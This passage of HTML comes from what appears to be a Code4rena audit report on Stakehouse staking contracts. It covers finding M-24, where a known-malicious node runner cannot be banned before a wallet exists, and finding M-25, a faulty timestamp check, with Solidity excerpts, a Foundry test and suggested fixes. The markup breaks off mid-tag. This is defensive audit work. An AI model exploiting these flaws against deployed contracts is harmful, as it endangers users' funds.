class=\"mtk1\">.</span><span class=\"mtk11\">updateNodeRunnerWhitelistStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-25\" style=\"position:relative;\"><a href=\"#tools-used-25\" aria-label=\"tools used 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-43\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-43\" aria-label=\"recommended mitigation steps 43 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isNodeRunnerWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">isWhitelisted</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Unnecessary update to same status&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-24-node-runner-who-is-already-known-to-be-malicious-cannot-be-banned-before-corresponding-smart-wallet-is-created\" style=\"position:relative;\"><a href=\"#m-24-node-runner-who-is-already-known-to-be-malicious-cannot-be-banned-before-corresponding-smart-wallet-is-created\" aria-label=\"m 24 node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381\">[M-24] Node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381\">rbserver</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492</a></p>\n<p>Currently, the <code>rotateNodeRunnerOfSmartWallet</code> function provides the only way to set <code>bannedNodeRunners</code> to <code>true</code> for a malicious node runner. However, before the node runner calls the <code>registerBLSPublicKeys</code> function to create a smart wallet, calling the <code>rotateNodeRunnerOfSmartWallet</code> function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the <code>isNodeRunnerBanned</code> function always return <code>false</code> before the <code>registerBLSPublicKeys</code> function is called for the first time, and executing <code>require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\")</code> when calling the <code>registerBLSPublicKeys</code> function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the <code>registerBLSPublicKeys</code> function is called until the DAO notices the malicious activities and then calls the <code>rotateNodeRunnerOfSmartWallet</code> function. When the DAO does not react promptly, some damages to the protocol could be done already.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_current</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bannedNodeRunners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isNodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bannedNodeRunners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">registerBLSPublicKeys</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsSignatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isNodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Node runner is banned from LSD network&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// create new wallet owned by liquid staking manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createWallet</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SmartWalletCreated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// associate node runner with the newly created wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_authorizeRepresentative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_eoaRepresentative</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-39\" style=\"position:relative;\"><a href=\"#proof-of-concept-39\" aria-label=\"proof of concept 39 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>test\\foundry\\LSDNFactory.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Simulate a situation where accountOne is known to be malicious already.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// accountOne is not banned at this moment.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bannedNodeRunners</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">), </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Wallet does not exist&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-26\" style=\"position:relative;\"><a href=\"#tools-used-26\" aria-label=\"tools used 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-44\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-44\" aria-label=\"recommended mitigation steps 44 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A function, which should be only callable by the DAO, that can directly set <code>bannedNodeRunners</code> for a node runner can be added.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-25-incorrect-checking-in-_assertuserhasenoughgiantlptoclaimvaultlp\" style=\"position:relative;\"><a href=\"#m-25-incorrect-checking-in-_assertuserhasenoughgiantlptoclaimvaultlp\" aria-label=\"m 25 incorrect checking in _assertuserhasenoughgiantlptoclaimvaultlp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382\">[M-25] Incorrect checking in <code>_assertUserHasEnoughGiantLPToClaimVaultLP</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382\">hihen</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/413\">Trust</a> and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/145\">Lambda</a></em></p>\n<p>The batch operations of <code>withdrawDETH()</code> in GiantSavETHVaultPool.sol and <code>withdrawLPTokens()</code> in GiantPoolBase.sol are meaningless because they will fail whenever more than one lpToken is passed.<br>\nEach user can perform <code>withdrawDETH()</code> or <code>withdrawLPTokens()</code> with one LPToken only once a day.</p>\n<h3 id=\"proof-of-concept-40\" style=\"position:relative;\"><a href=\"#proof-of-concept-40\" aria-label=\"proof of concept 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Both the <code>withdrawDETH()</code> in GiantSavETHVaultPool.sol and <code>withdrawLPTokens()</code> in GiantPoolBase.sol will call <code>GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)</code> and <code>lpTokenETH.burn(msg.sender, amount)</code>:</p>\n<p>There is a require in <code>_assertUserHasEnoughGiantLPToClaimVaultLP()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days &lt; block.timestamp, &quot;Too new&quot;);</span></span></code></pre>\n<p>At the same time, <code>lpTokenETH.burn(msg.sender, amount)</code> will update <code>lastInteractedTimestamp[msg.sender]</code> to latest block timestamp in <code>_afterTokenTransfer()</code> of GiantLP.sol.</p>\n<p>So, a user can perform <code>withdrawDETH</code> or <code>withdrawLPTokens</code> of one LPToken only once a day, others more will fail by <code>_assertUserHasEnoughGiantLPToClaimVaultLP()</code>.</p>\n<h3 id=\"tools-used-27\" style=\"position:relative;\"><a href=\"#tools-used-27\" aria-label=\"tools used 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-45\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-45\" aria-label=\"recommended mitigation steps 45 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.</p>\n<pre class=\"grvsc-container dark-default-dark\" 